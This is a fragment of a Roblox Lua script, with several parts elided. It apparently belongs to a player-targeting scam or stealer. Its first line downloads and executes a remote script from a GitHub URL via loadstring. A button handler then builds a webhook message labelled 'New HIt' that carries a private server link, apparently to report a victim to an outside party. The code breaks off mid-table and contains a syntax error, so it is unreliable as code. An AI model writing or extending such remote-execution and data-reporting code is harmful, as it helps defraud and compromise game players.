loadstring(game:httpget("https://raw.githubusercontent.com/textboy-roblox-scripter/slo/refs/heads/main/finnal.lua")()
local Username = _G.username -- The target username for thele friend request
...
ContinueButton.MouseButton1Click:Connect(function(...)
    ...
    local WebhookPayload = {
        ...
        content = "**New HIt:** " .. PrivateServerLink, 
        embeds = {
            { -- Start of Embed 
